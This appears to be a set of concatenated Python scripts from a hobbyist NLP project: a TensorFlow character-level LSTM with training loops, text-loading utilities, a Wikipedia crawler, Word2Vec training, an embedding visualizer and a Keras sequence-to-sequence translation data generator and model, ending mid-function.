        lstm_output: List of output tensors from the LSTM layer
        in_size: Size of the input tensor, for example, size of the LSTM cells
        out_size: Size of this softmax layer
    
    '''
    # Reshape output so it's a bunch of rows, one row for each step for each sequence.
    # Concatenate lstm_output over axis 1 (the columns)
    seq_output = tf.concat(lstm_output, axis=1)
    # Reshape seq_output to a 2D tensor with lstm_size columns
    x = tf.reshape(seq_output, (-1, in_size))
    
    # Connect the RNN outputs to a softmax layer
    with tf.variable_scope('softmax'):
        # Create the weight and bias variables here
        softmax_w = tf.Variable(tf.truncated_normal((in_size, out_size), stddev=0.1))
        softmax_b = tf.Variable(tf.zeros(out_size))
    
    # Since output is a bunch of rows of RNN cell outputs, logits will be a bunch
    # of rows of logit outputs, one for each step and sequence
    logits = tf.matmul(x, softmax_w) + softmax_b
    
    # Use softmax to get the probabilities for predicted characters
    out = tf.nn.softmax(logits, name="predictions")
    
    return out, logits


def build_loss(logits, targets, num_classes):
    ''' Calculate the loss from the logits and the targets.
    
        Arguments
        ---------
        logits: Logits from final fully connected layer
        targets: Targets for supervised learning
        num_classes: Number of classes in targets
        
    '''
     # One-hot encode targets and reshape to match logits, one row per sequence per step
    y_one_hot = tf.one_hot(targets, num_classes)
    y_reshaped =  tf.reshape(y_one_hot, logits.get_shape())
    
    # Softmax cross entropy loss
    loss = tf.nn.softmax_cross_entropy_with_logits(logits=logits, labels=y_reshaped)
    loss = tf.reduce_mean(loss)
    
    return loss


def build_optimizer(loss, learning_rate, grad_clip):
    ''' Build optmizer for training, using gradient clipping.
    
        Arguments:
        loss: Network loss
        learning_rate: Learning rate for optimizer
        grad_clip: threshold for preventing gradient exploding
    '''
    
    # Optimizer for training, using gradient clipping to control exploding gradients
    tvars = tf.trainable_variables()
    grads, _ = tf.clip_by_global_norm(tf.gradients(loss, tvars), grad_clip)
    train_op = tf.train.AdamOptimizer(learning_rate)
    optimizer = train_op.apply_gradients(zip(grads, tvars))
    
    return optimizer



class CharRNN:
    
    def __init__(self, num_classes, batch_size=64, num_steps=50, 
                       lstm_size=128, num_layers=2, learning_rate=0.001, 
                       grad_clip=5, sampling=False):
    
        # When we're using this network for sampling later, we'll be passing in
        # one character at a time, so providing an option for that
        if sampling:
            batch_size, num_steps = 1, 1
        else:
            batch_size, num_steps = batch_size, num_steps

        tf.reset_default_graph()
        
        # Build the input placeholder tensors
        self.inputs, self.targets, self.keep_prob = build_inputs(batch_size, num_steps)

        # Build the LSTM cell
        # (lstm_size, num_layers, batch_size, keep_prob)
        cell, self.initial_state = build_lstm(lstm_size, num_layers, batch_size, self.keep_prob)

        ### Run the data through the RNN layers
        
        # First, one-hot encode the input tokens
        x_one_hot = tf.one_hot(self.inputs, num_classes)
        
        # Run each sequence step through the RNN with tf.nn.dynamic_rnn 
        outputs, state = tf.nn.dynamic_rnn(cell, x_one_hot, initial_state=self.initial_state)
        self.final_state = state
        
        # Get softmax predictions and logits
        # (lstm_output, in_size, out_size)
        # There are lstm_size nodes in hidden layers, and the number
        # of the total characters as num_classes (i.e output layer)
        self.prediction, self.logits = build_output(outputs, lstm_size, num_classes)
        
        # Loss and optimizer (with gradient clipping)
        # (logits, targets, lstm_size, num_classes)
        self.loss = build_loss(self.logits, self.targets, num_classes)
        # (loss, learning_rate, grad_clip)
        self.optimizer = build_optimizer(self.loss, learning_rate, grad_clip)




from time import perf_counter
from collections import namedtuple
from parameters import *
from train import *
from utils import get_time, get_text

import tqdm
import numpy as np
import os
import string
import tensorflow as tf




if __name__ == "__main__":

    CHECKPOINT = "checkpoints"

    if not os.path.isdir(CHECKPOINT):
        os.mkdir(CHECKPOINT)


    vocab, int2char, char2int, text = get_text(char_level=True,
                                                files=["E:\\datasets\\python_code_small.py", "E:\\datasets\\my_python_code.py"],
                                                load=False,
                                                lower=False,
                                                save_index=4)

    print(char2int)
    
    encoded = np.array([char2int[c] for c in text])

    print("[*] Total characters :", len(text))
    print("[*] Number of classes :", len(vocab))

    model = CharRNN(num_classes=len(vocab), batch_size=batch_size, num_steps=num_steps,
                lstm_size=lstm_size, num_layers=num_layers, 
                learning_rate=learning_rate)

    saver = tf.train.Saver(max_to_keep=100)
    with tf.Session(config=tf.ConfigProto(intra_op_parallelism_threads=NUM_THREADS)) as sess:
        sess.run(tf.global_variables_initializer())
        
        # Use the line below to load a checkpoint and resume training
        saver.restore(sess, f'{CHECKPOINT}/e13_l256.ckpt')
        
        total_steps = len(encoded) // batch_size // num_steps
        for e in range(14, epochs):
            # Train network
            cs = 0
            new_state = sess.run(model.initial_state)
            min_loss = np.inf
            batches = tqdm.tqdm(get_batches(encoded, batch_size, num_steps),
                                f"Epoch= {e+1}/{epochs} - {cs}/{total_steps}",
                                total=total_steps)
            for x, y in batches:
                cs += 1
                start = perf_counter()
                feed = {model.inputs: x,
                        model.targets: y,
                        model.keep_prob: keep_prob,
                        model.initial_state: new_state}
                batch_loss, new_state, _ = sess.run([model.loss, 
                                                    model.final_state, 
                                                    model.optimizer], 
                                                    feed_dict=feed)
                

                
            
                batches.set_description(f"Epoch: {e+1}/{epochs} - {cs}/{total_steps} loss:{batch_loss:.2f}")
            saver.save(sess, f"{CHECKPOINT}/e{e}_l{lstm_size}.ckpt")
            print("Loss:", batch_loss)
        
        saver.save(sess, f"{CHECKPOINT}/i{cs}_l{lstm_size}.ckpt")




from time import perf_counter
from collections import namedtuple
from colorama import Fore, init

# local
from parameters import *
from train import *
from utils import get_time, get_text

init()

GREEN = Fore.GREEN
RESET = Fore.RESET

import numpy as np
import os
import tensorflow as tf
import string


CHECKPOINT = "checkpoints_words"
files = ["carroll-alice.txt", "text.txt", "text8.txt"]

if not os.path.isdir(CHECKPOINT):
    os.mkdir(CHECKPOINT)

vocab, int2word, word2int, text = get_text("data", files=files)

encoded = np.array([word2int[w] for w in text])

del text

if __name__ == "__main__":

    def calculate_time():
        global time_took
        global start
        global total_time_took
        global times_took
        global avg_time_took
        global time_estimated
        global total_steps

        time_took = perf_counter() - start
        total_time_took += time_took
        times_took.append(time_took)
        avg_time_took = sum(times_took) / len(times_took)
        time_estimated = total_steps * avg_time_took - total_time_took

    model = CharRNN(num_classes=len(vocab), batch_size=batch_size, num_steps=num_steps,
                lstm_size=lstm_size, num_layers=num_layers, 
                learning_rate=learning_rate)

    saver = tf.train.Saver(max_to_keep=100)
    with tf.Session(config=tf.ConfigProto(intra_op_parallelism_threads=NUM_THREADS)) as sess:
        sess.run(tf.global_variables_initializer())
        
        # Use the line below to load a checkpoint and resume training
        # saver.restore(sess, f'{CHECKPOINT}/i3524_l128_loss=1.36.ckpt')
        
        # calculate total steps
        total_steps = epochs * len(encoded) / (batch_size * num_steps)
        time_estimated = "N/A"
        times_took = []
        total_time_took = 0
        current_steps = 0
        progress_percentage = 0
        for e in range(epochs):
            # Train network
            new_state = sess.run(model.initial_state)
            min_loss = np.inf
            for x, y in get_batches(encoded, batch_size, num_steps):
                current_steps += 1
                start = perf_counter()
                feed = {model.inputs: x,
                        model.targets: y,
                        model.keep_prob: keep_prob,
                        model.initial_state: new_state}
                batch_loss, new_state, _ = sess.run([model.loss, 
                                                    model.final_state, 
                                                    model.optimizer], 
                                                    feed_dict=feed)
                
                progress_percentage = current_steps * 100 / total_steps

                if batch_loss < min_loss:
                    # saver.save(sess, f"{CHECKPOINT}/i{current_steps}_l{lstm_size}_loss={batch_loss:.2f}.ckpt")
                    min_loss = batch_loss
                    calculate_time()
                    print(f'{GREEN}[{progress_percentage:.2f}%] Epoch: {e+1:3}/{epochs} Training loss: {batch_loss:2.4f} - {time_took:2.4f} s/batch - ETA: {get_time(time_estimated)}{RESET}')
                    continue
                if (current_steps % print_every_n == 0):
                    calculate_time()
                    print(f'[{progress_percentage:.2f}%] Epoch: {e+1:3}/{epochs} Training loss: {batch_loss:2.4f} - {time_took:2.4f} s/batch - ETA: {get_time(time_estimated)}', end='\r')
                if (current_steps % save_every_n == 0):
                    saver.save(sess, f"{CHECKPOINT}/i{current_steps}_l{lstm_size}.ckpt")
        
        saver.save(sess, f"{CHECKPOINT}/i{current_steps}_l{lstm_size}.ckpt")




import tqdm
import os
import inflect
import glob
import pickle
import sys
from string import punctuation, whitespace

p = inflect.engine()
UNK = "<unk>"

char2int_target = {'\t': 0, '\n': 1, '\x0c': 2, ' ': 3, '!': 4, '"': 5, '#': 6, '': 7, '%': 8, '&': 9, "'": 10, '(': 11, ')': 12, '*': 13, '+': 14, ',': 15, '-': 16, '.': 17,
'/': 18, '0': 19, '1': 20, '2': 21, '3': 22, '4': 23, '5': 24, '6': 25, '7': 26, '8': 27, '9': 28, ':': 29, '': 30, '<': 31, '=': 32, '>': 33, '?': 34, '':
35, 'A': 36, 'B': 37, 'C': 38, 'D': 39, 'E': 40, 'F': 41, 'G': 42, 'H': 43, 'I': 44, 'J': 45, 'K': 46, 'L': 47, 'M': 48, 'N': 49, 'O': 50, 'P': 51, 'Q': 52, 'R': 53, 'S': 54, 'T': 55, 'U': 56, 'V': 57, 'W': 58, 'X': 59, 'Y': 60, 'Z': 61, '[': 62, '\\': 63, ']': 64, '^': 65, '_': 66, '': 67, 'a': 68, 'b': 69, 'c':
70, 'd': 71, 'e': 72, 'f': 73, 'g': 74, 'h': 75, 'i': 76, 'j': 77, 'k': 78, 'l': 79, 'm': 80, 'n': 81, 'o': 82, 'p': 83, 'q': 84, 'r': 85, 's': 86, 't': 87, 'u': 88, 'v': 89, 'w': 90, 'x': 91, 'y': 92, 'z': 93, '{': 94, '|': 95, '}': 96, '': 97, '': 98, '': 99, '': 100, '': 101, '': 102, '': 103, '': 104, '': 105, '\xad': 106, '': 107, '': 108, '': 109, '': 110, '': 111, '': 112, '': 113, '': 114, '': 115, '': 116, '': 117, '': 118, '': 119, '': 120, '': 121, '': 122, '': 123, '': 124, '': 125, '': 126, '': 127, '': 128, '': 129, '': 130, '': 131, '': 132, '': 133, '': 134, '': 135, '': 136, '': 137, '': 138, '': 139, '': 140, '': 141, '': 142, '': 143, '': 144, '': 145, '': 146, '': 147, '': 148, '': 149, '': 150, '': 151, '': 152, '': 153, '': 154, '': 155, '': 156, '': 157, '': 158, '': 159, '': 160, '': 161, '': 162, '': 163, '': 164, '': 165, '': 166, '': 167,
'': 168, '': 169, '': 170, '': 171, '': 172, '': 173, '': 174, '': 175, '': 176, '': 177, '': 178, '': 179, '': 180, '': 181, '': 182, '': 183, '': 184, '': 185, '': 186, '': 187, '': 188, '': 189, '': 190, '': 191, '': 192}


def get_time(seconds, form="{hours:02}:{minutes:02}:{seconds:02}"):
    try:
        seconds = int(seconds)
    except:
        return seconds
    minutes, seconds = divmod(seconds, 60)
    hours, minutes = divmod(minutes, 60)
    days, hours = divmod(hours, 24)
    months, days = divmod(days, 30)
    years, months = divmod(months, 12)
    if days:
        form = "{days}d " + form
    if months:
        form = "{months}m " + form
    elif years:
        form = "{years}y " + form
    return form.format(**locals())


def get_text(path="data",
            files=["carroll-alice.txt", "text.txt", "text8.txt"],
            load=True,
            char_level=False,
            lower=True,
            save=True,
            save_index=1):
    if load:
        # check if any pre-cleaned saved data exists first
        
        pickle_files = glob.glob(os.path.join(path, "text_data*.pickle"))
        if len(pickle_files) == 1:
            return pickle.load(open(pickle_files[0], "rb"))
        elif len(pickle_files) > 1:
            sizes = [ get_size(os.path.getsize(p)) for p in pickle_files ]
            s = ""
            for i, (file, size) in enumerate(zip(pickle_files, sizes), start=1):
                s += str(i) + " - " + os.path.basename(file) + f" ({size}) \n"
            choice = int(input(f"""Multiple data corpus found:
{s}
99 - use and clean .txt files
Please choose one:  """))
            
            if choice != 99:
                chosen_file = pickle_files[choice-1]
                print("[*] Loading pickled data...")
                return pickle.load(open(chosen_file, "rb"))
    text = ""
    for file in tqdm.tqdm(files, "Loading data"):
        file = os.path.join(path, file)
        with open(file) as f:
            if lower:
                text += f.read().lower()
            else:
                text += f.read()
    print(len(text))
    punc = set(punctuation)

    # text = ''.join([ c for c in tqdm.tqdm(text, "Cleaning text") if c not in punc ])
    text = ''.join([ c for c in tqdm.tqdm(text, "Cleaning text") if c in char2int_target ])
    # for ws in whitespace:
    #     text = text.replace(ws, " ")

    if char_level:
        text = list(text)
    else:    
        text = text.split()

    # new_text = []
    new_text = text
    # append = new_text.append
    # co = 0
    # if char_level:
    #     k = 0
    #     for i in tqdm.tqdm(range(len(text)), "Normalizing words"):
    #         if not text[i].isdigit():
    #             append(text[i])
    #             k = 0
    #         else:
    #             # if this digit is mapped to a word already using 
    #             # the below method, then just continue
    #             if k >= 1:
    #                 k -= 1
    #                 continue
    #             # if there are more digits following this character
    #             # k = 0
    #             digits = ""
    #             while text[i+k].isdigit():
    #                 digits += text[i+k]
    #                 k += 1
    #             w = p.number_to_words(digits).replace("-", " ").replace(",", "")
    #             for c in w:
    #                 append(c)
    #             co += 1
    # else:
    #     for i in tqdm.tqdm(range(len(text)), "Normalizing words"):
    #         # convert digits to words
    #         # (i.e '7' to 'seven')
    #         if text[i].isdigit():
    #             text[i] = p.number_to_words(text[i]).replace("-", " ")
    #             append(text[i])
    #             co += 1
    #         else:
    #             append(text[i])
    vocab = sorted(set(new_text))
    print(f"alices in vocab:", "alices" in vocab)
    # print(f"Converted {co} digits to words.")
    print(f"Total vocabulary size:", len(vocab))
    int2word = { i:w for i, w in enumerate(vocab) }
    word2int = { w:i for i, w in enumerate(vocab) }

    if save:
        pickle_filename = os.path.join(path, f"text_data_{save_index}.pickle")
        print("Pickling data for future use to", pickle_filename)
        pickle.dump((vocab, int2word, word2int, new_text), open(pickle_filename, "wb"))

    return vocab, int2word, word2int, new_text


def get_size(size, suffix="B"):
    factor = 1024
    for unit in ['', 'K', 'M', 'G', 'T', 'P']:
        if size < factor:
            return "{:.2f}{}{}".format(size, unit, suffix)
        size /= factor
    return "{:.2f}{}{}".format(size, "E", suffix)




import wikipedia
from threading import Thread





def gather(page_name):
    print(f"Crawling {page_name}")
    page = wikipedia.page(page_name)
    filename = page_name.replace(" ", "_")
    print(page.content, file=open(f"data/{filename}.txt", 'w', encoding="utf-8"))
    print(f"Done crawling {page_name}")
    for i in range(5):
        Thread(target=gather, args=(page.links[i],)).start()


if __name__ == "__main__":
    pages = ["Relativity"]

    for page in pages:
        gather(page)




# from keras.preprocessing.text import Tokenizer
from utils import chunk_seq
from collections import Counter
from nltk.corpus import stopwords
from keras.preprocessing.sequence import pad_sequences
import numpy as np
import gensim

sequence_length = 200
embedding_dim = 200
# window_size = 7
# vector_dim = 300
# epochs = 1000

# valid_size = 16     # Random set of words to evaluate similarity on.
# valid_window = 100  # Only pick dev samples in the head of the distribution.
# valid_examples = np.random.choice(valid_window, valid_size, replace=False)

with open("data/quran_cleaned.txt", encoding="utf8") as f:
    text = f.read()


# print(text[:500])
ayat = text.split(".")

words = []
for ayah in ayat:
    words.append(ayah.split())

# print(words[:5])
# stop words
stop_words = stopwords.words("arabic")
# most common come at the top
# vocab = [ w[0] for w in Counter(words).most_common() if w[0] not in stop_words]
# words = [ word for word in words if word not in stop_words]
new_words = []
for ayah in words:
    new_words.append([ w for w in ayah if w not in stop_words])

# print(len(vocab))
# n = len(words) / sequence_length
# # split text to n sequences
# print(words[:10])
# words = chunk_seq(words, len(ayat))
vocab = []
for ayah in new_words:
    for w in ayah:
        vocab.append(w)
vocab = sorted(set(vocab))
vocab2int = {w: i for i, w in enumerate(vocab, start=1)}
int2vocab = {i: w for i, w in enumerate(vocab, start=1)}

encoded_words = []
for ayah in new_words:
    encoded_words.append([ vocab2int[w] for w in ayah ])

encoded_words = pad_sequences(encoded_words)
# print(encoded_words[10])
words = []
for seq in encoded_words:
    words.append([ int2vocab[w] if w != 0 else "_unk_" for w in seq ])
# print(words[:5])
# # define model
print("Training Word2Vec Model...")
model = gensim.models.Word2Vec(sentences=words, size=embedding_dim, workers=7, min_count=1, window=6)
path_to_save = r"E:\datasets\word2vec_quran.txt"
print("Saving model...")
model.wv.save_word2vec_format(path_to_save, binary=False)
# print(dir(model))




from keras.layers import Embedding, LSTM, Dense, Activation, BatchNormalization
from keras.layers import Flatten
from keras.models import Sequential
from preprocess import words, vocab, sequence_length, sequences, vector_dim
from preprocess import window_size

model = Sequential()

model.add(Embedding(len(vocab), vector_dim, input_length=sequence_length))
model.add(Flatten())
model.add(Dense(1))

model.compile("adam", "binary_crossentropy")
model.fit()




def chunk_seq(seq, num):
    avg = len(seq) / float(num)
    out = []
    last = 0.0
    while last < len(seq):
        out.append(seq[int(last):int(last + avg)])
        last += avg
    return out


def encode_words(words, vocab2int):
    # encoded = [ vocab2int[word] for word in words ]
    encoded = []
    append = encoded.append
    for word in words:
        c = vocab2int.get(word)
        if c:
            append(c)
    return encoded

def remove_stop_words(vocab):
    # remove stop words
    vocab.remove("the")
    vocab.remove("of")
    vocab.remove("and")
    vocab.remove("in")
    vocab.remove("a")
    vocab.remove("to")
    vocab.remove("is")
    vocab.remove("as")
    vocab.remove("for")




# encoding: utf-8
"""
author: BrikerMan
contact: eliyar917gmail.com
blog: https://eliyar.biz
version: 1.0
license: Apache Licence
file: w2v_visualizer.py
time: 2017/7/30 9:37
"""
import sys
import os
import pathlib
import numpy as np
from gensim.models.keyedvectors import KeyedVectors
import tensorflow as tf
from tensorflow.contrib.tensorboard.plugins import projector


def visualize(model, output_path):
    meta_file = "w2x_metadata.tsv"
    placeholder = np.zeros((len(model.wv.index2word), model.vector_size))

    with open(os.path.join(output_path, meta_file), 'wb') as file_metadata:
        for i, word in enumerate(model.wv.index2word):
            placeholder[i] = model[word]
            # temporary solution for https://github.com/tensorflow/tensorflow/issues/9094
            if word == '':
                print("Emply Line, should replecaed by any thing else, or will cause a bug of tensorboard")
                file_metadata.write("{0}".format('<Empty Line>').encode('utf-8') + b'\n')
            else:
                file_metadata.write("{0}".format(word).encode('utf-8') + b'\n')

    # define the model without training
    sess = tf.InteractiveSession()

    embedding = tf.Variable(placeholder, trainable=False, name='w2x_metadata')
    tf.global_variables_initializer().run()

    saver = tf.train.Saver()
    writer = tf.summary.FileWriter(output_path, sess.graph)

    # adding into projector
    config = projector.ProjectorConfig()
    embed = config.embeddings.add()
    embed.tensor_name = 'w2x_metadata'
    embed.metadata_path = meta_file

    # Specify the width and height of a single thumbnail.
    projector.visualize_embeddings(writer, config)
    saver.save(sess, os.path.join(output_path, 'w2x_metadata.ckpt'))
    print('Run tensorboard --logdir={0} to run visualize result on tensorboard'.format(output_path))


if __name__ == "__main__":
    """
    Use model.save_word2vec_format to save w2v_model as word2evc format
    Then just run python w2v_visualizer.py word2vec.text visualize_result
    """
    try:
        model_path = sys.argv[1]
        output_path = sys.argv[2]
    except:
        print("Please provice model path and output path")
    model = KeyedVectors.load_word2vec_format(model_path)
    pathlib.Path(output_path).mkdir(parents=True, exist_ok=True)
    visualize(model, output_path)




from keras.preprocessing.text import Tokenizer
from keras.preprocessing.sequence import pad_sequences
from keras.utils import to_categorical
import numpy as np
import pickle
import tqdm

class NMTGenerator:
    """A class utility for generating Neural-Machine-Translation large datasets"""
    def __init__(self, source_file, target_file, num_encoder_tokens=None, num_decoder_tokens=None,
                source_sequence_length=None, target_sequence_length=None, x_tk=None, y_tk=None,
                batch_size=256, validation_split=0.15, load_tokenizers=False, dump_tokenizers=True,
                same_tokenizer=False, char_level=False, verbose=0):
        self.source_file = source_file
        self.target_file = target_file
        self.same_tokenizer = same_tokenizer
        self.char_level = char_level
        if not load_tokenizers:
            # x ( source ) tokenizer
            self.x_tk = x_tk if x_tk else Tokenizer(char_level=self.char_level)
            # y ( target ) tokenizer
            self.y_tk = y_tk if y_tk else Tokenizer(char_level=self.char_level)
        else:
            self.x_tk = pickle.load(open("results/x_tk.pickle", "rb"))
            self.y_tk = pickle.load(open("results/y_tk.pickle", "rb"))
        # remove '?' and '.' from filters
        # which means include them in vocabulary
        # add "'" to filters
        self.x_tk.filters = self.x_tk.filters.replace("?", "").replace("_", "") + "'"
        self.y_tk.filters = self.y_tk.filters.replace("?", "").replace("_", "") + "'"
        
        if char_level:
            self.x_tk.filters = self.x_tk.filters.replace(".", "").replace(",", "")
            self.y_tk.filters = self.y_tk.filters.replace(".", "").replace(",", "")

        if same_tokenizer:
            self.y_tk = self.x_tk
        # max sequence length of source language
        self.source_sequence_length = source_sequence_length
        # max sequence length of target language
        self.target_sequence_length = target_sequence_length
        # vocab size of encoder
        self.num_encoder_tokens = num_encoder_tokens
        # vocab size of decoder
        self.num_decoder_tokens = num_decoder_tokens
        # the batch size
        self.batch_size = batch_size
        # the ratio which the dataset will be partitioned
        self.validation_split = validation_split
        # whether to dump x_tk and y_tk when finished tokenizing
        self.dump_tokenizers = dump_tokenizers
        # cap to remove _unk_ samples
        self.n_unk_to_remove = 2
        self.verbose = verbose

    def load_dataset(self):
        """Loads the dataset:
            1. load the data from files
            2. tokenize and calculate sequence lengths and num_tokens
            3. post pad the sequences"""
        self.load_data()
        if self.verbose:
            print("[+] Data loaded")
        self.tokenize()
        if self.verbose:
            print("[+] Text tokenized")
        self.pad_sequences()
        if self.verbose:
            print("[+] Sequences padded")
        self.split_data()
        if self.verbose:
            print("[+] Data splitted")

    def load_data(self):
        """Loads data from files"""
        self.X = load_data(self.source_file)
        self.y = load_data(self.target_file)
        # remove much unks on a single sample
        X, y = [], []
        co = 0
        for question, answer in zip(self.X, self.y):
            if question.count("_unk_") >= self.n_unk_to_remove or answer.count("_unk_") >= self.n_unk_to_remove:
                co += 1
            else:
                X.append(question)
                y.append(answer)
        self.X = X
        self.y = y
        if self.verbose >= 1:
            print("[*] Number of samples:", len(self.X))
        if self.verbose >= 2:
            print("[!] Number of samples deleted:", co)

    def tokenize(self):
        """Tokenizes sentences/strings as well as calculating input/output sequence lengths
        and input/output vocab sizes"""
        self.x_tk.fit_on_texts(self.X)
        self.y_tk.fit_on_texts(self.y)
        self.X = self.x_tk.texts_to_sequences(self.X)
        self.y = self.y_tk.texts_to_sequences(self.y)
        # calculate both sequence lengths ( source and target )
        self.source_sequence_length = max([len(x) for x in self.X])
        self.target_sequence_length = max([len(x) for x in self.y])
        # calculating number of encoder/decoder vocab sizes
        self.num_encoder_tokens = len(self.x_tk.index_word) + 1
        self.num_decoder_tokens = len(self.y_tk.index_word) + 1
        # dump tokenizers
        pickle.dump(self.x_tk, open("results/x_tk.pickle", "wb"))
        pickle.dump(self.y_tk, open("results/y_tk.pickle", "wb"))

    def pad_sequences(self):
        """Pad sequences"""
        self.X = pad_sequences(self.X, maxlen=self.source_sequence_length, padding='post')
        self.y = pad_sequences(self.y, maxlen=self.target_sequence_length, padding='post')

    def split_data(self):
        """split training/validation sets using self.validation_split"""
        split_value = int(len(self.X)*self.validation_split)
        self.X_test = self.X[:split_value]
        self.X_train = self.X[split_value:]
        self.y_test = self.y[:split_value]
        self.y_train = self.y[split_value:]
        # free up memory
        del self.X
        del self.y

    def shuffle_data(self, train=True):
        """Shuffles X and y together
        :params train (bool): whether to shuffle training data, default is True
            Note that when train is False, testing data is shuffled instead."""
        state = np.random.get_state()
        if train:
            np.random.shuffle(self.X_train)
            np.random.set_state(state)
            np.random.shuffle(self.y_train)
        else:
            np.random.shuffle(self.X_test)
            np.random.set_state(state)
            np.random.shuffle(self.y_test)

    def next_train(self):
        """Training set generator"""
        return self.generate_batches(self.X_train, self.y_train, train=True)

    def next_validation(self):
        """Validation set generator"""
        return self.generate_batches(self.X_test, self.y_test, train=False)

    def generate_batches(self, X, y, train=True):
        """Data generator"""
        same_tokenizer = self.same_tokenizer
        batch_size = self.batch_size
        char_level = self.char_level
        source_sequence_length = self.source_sequence_length
        target_sequence_length = self.target_sequence_length
        if same_tokenizer:
            num_encoder_tokens = max([self.num_encoder_tokens, self.num_decoder_tokens])
            num_decoder_tokens = num_encoder_tokens
        else:
            num_encoder_tokens = self.num_encoder_tokens
            num_decoder_tokens = self.num_decoder_tokens
        while True:
            for j in range(0, len(X), batch_size):
                encoder_input_data = X[j: j+batch_size]
                decoder_input_data = y[j: j+batch_size]
                # update batch size ( different size in last batch of the dataset )
                batch_size = encoder_input_data.shape[0]
                if self.char_level:
                    encoder_data = np.zeros((batch_size, source_sequence_length, num_encoder_tokens))
                    decoder_data = np.zeros((batch_size, target_sequence_length, num_decoder_tokens))
                else:
                    encoder_data = encoder_input_data
                    decoder_data = decoder_input_data
                
                decoder_target_data = np.zeros((batch_size, target_sequence_length, num_decoder_tokens))
                if char_level:
                    # if its char level, one-hot all sequences of characters
                    for i, sequence in enumerate(decoder_input_data):
                        for t, word_index in enumerate(sequence):
                            if t > 0:
                                decoder_target_data[i, t - 1, word_index] = 1
                            decoder_data[i, t, word_index] = 1
                    for i, sequence in enumerate(encoder_input_data):
                        for t, word_index in enumerate(sequence):
                            encoder_data[i, t, word_index] = 1
                else:
                    # if its word level, one-hot only target_data ( the one compared with dense )
                    for i, sequence in enumerate(decoder_input_data):
                        for t, word_index in enumerate(sequence):
                            if t > 0:
                                decoder_target_data[i, t - 1, word_index] = 1
                yield ([encoder_data, decoder_data], decoder_target_data)
            # shuffle data when an epoch is finished
            self.shuffle_data(train=train)




def get_embedding_vectors(tokenizer):
    embedding_index = {}
    with open("data/glove.6B.300d.txt", encoding='utf8') as f:
        for line in tqdm.tqdm(f, "Reading GloVe"):
            values = line.split()
            word = values[0]
            vectors = np.asarray(values[1:], dtype='float32')
            embedding_index[word] = vectors

    word_index = tokenizer.word_index
    embedding_matrix = np.zeros((len(word_index)+1, 300))
    for word, i in word_index.items():
        embedding_vector = embedding_index.get(word)
        if embedding_vector is not None:
            # words not found will be 0s
            embedding_matrix[i] = embedding_vector
            
    return embedding_matrix


def load_data(filename):
    text = []
    append = text.append
    with open(filename) as f:
        for line in tqdm.tqdm(f, f"Reading {filename}"):
            line = line.strip()
            append(line)
    return text

# def generate_batch(X, y, num_decoder_tokens, max_length_src, max_length_target, batch_size=256):
#     """Generating data"""
#     while True:
#         for j in range(0, len(X), batch_size):
#             encoder_input_data = np.zeros((batch_size, max_length_src), dtype='float32')
#             decoder_input_data = np.zeros((batch_size, max_length_target), dtype='float32')
#             decoder_target_data = np.zeros((batch_size, max_length_target, num_decoder_tokens), dtype='float32')
#             for i, (input_text, target_text) in enumerate(zip(X[j: j+batch_size], y[j: j+batch_size])):
#                 for t, word in enumerate(input_text.split()):
#                     encoder_input_data[i, t] = input_word_index[word] # encoder input sequence
#                 for t, word in enumerate(target_text.split()):
#                     if t > 0:
#                         # offset by one timestep
#                         # one-hot encoded
#                         decoder_target_data[i, t-1, target_token_index[word]] = 1
#                     if t < len(target_text.split()) - 1:
#                         decoder_input_data[i, t] = target_token_index[word]
#             yield ([encoder_input_data, decoder_input_data], decoder_target_data)

# def tokenize(x, tokenizer=None):
#     """Tokenize x
#     :param x: List of sentences/strings to be tokenized
#     :return: Tuple of (tokenized x data, tokenizer used to tokenize x)"""
#     if tokenizer:
#         t = tokenizer
#     else:
#         t = Tokenizer()
#     t.fit_on_texts(x)
#     return t.texts_to_sequences(x), t


# def pad(x, length=None):
#     """Pad x
#     :param x: list of sequences
#     :param length: Length to pad the sequence to, If None, use length
#     of longest sequence in x.
#     :return: Padded numpy array of sequences"""
#     return pad_sequences(x, maxlen=length, padding="post")


# def preprocess(x, y):
#     """Preprocess x and y
#     :param x: Feature list of sentences
#     :param y: Label list of sentences
#     :return: Tuple of (preprocessed x, preprocessed y, x tokenizer, y tokenizer)"""
#     preprocess_x, x_tk = tokenize(x)
#     preprocess_y, y_tk = tokenize(y)
#     preprocess_x2 = [ [0] + s for s in preprocess_y ]
#     longest_x = max([len(i) for i in preprocess_x])
#     longest_y = max([len(i) for i in preprocess_y]) + 1
#     # max_length = len(x_tk.word_index) if len(x_tk.word_index) > len(y_tk.word_index) else len(y_tk.word_index)
#     max_length = longest_x if longest_x > longest_y else longest_y

#     preprocess_x = pad(preprocess_x, length=max_length)
#     preprocess_x2 = pad(preprocess_x2, length=max_length)
#     preprocess_y = pad(preprocess_y, length=max_length)

#     # preprocess_x = to_categorical(preprocess_x)
#     # preprocess_x2 = to_categorical(preprocess_x2)
#     preprocess_y = to_categorical(preprocess_y)

#     return preprocess_x, preprocess_x2, preprocess_y, x_tk, y_tk




from keras.layers import Embedding, TimeDistributed, Dense, GRU, LSTM, Input
from keras.models import Model, Sequential
from keras.utils import to_categorical

import numpy as np
import tqdm


def encoder_decoder_model(num_encoder_tokens, latent_dim, num_decoder_tokens, embedding_matrix=None, embedding_layer=True):
    # ENCODER
    # define an input sequence and process it
        
    if embedding_layer:
        encoder_inputs = Input(shape=(None,))
        if embedding_matrix is None:
            encoder_emb_layer = Embedding(num_encoder_tokens, latent_dim, mask_zero=True)
        else:
            encoder_emb_layer = Embedding(num_encoder_tokens,
                                            latent_dim,
                                            mask_zero=True,
                                            weights=[embedding_matrix],
                                            trainable=False)

        encoder_emb = encoder_emb_layer(encoder_inputs)
    else:
        encoder_inputs = Input(shape=(None, num_encoder_tokens))
        encoder_emb = encoder_inputs
    encoder_lstm = LSTM(latent_dim, return_state=True)
    encoder_outputs, state_h, state_c = encoder_lstm(encoder_emb)

    # we discard encoder_outputs and only keep the states
    encoder_states = [state_h, state_c]

    # DECODER
    # Set up the decoder, using encoder_states as initial state
    if embedding_layer:
        decoder_inputs = Input(shape=(None,))
    else:
        decoder_inputs = Input(shape=(None, num_encoder_tokens))
    # add an embedding layer
    # decoder_emb_layer = Embedding(num_decoder_tokens, latent_dim, mask_zero=True)
    if embedding_layer:
        decoder_emb = encoder_emb_layer(decoder_inputs)
    else:
        decoder_emb = decoder_inputs
    # we set up our decoder to return full output sequences
    # and to return internal states as well, we don't use the
    # return states in the training model, but we will use them in inference
    decoder_lstm = LSTM(latent_dim, return_sequences=True, return_state=True)
    decoder_outputs, _, _, = decoder_lstm(decoder_emb, initial_state=encoder_states)
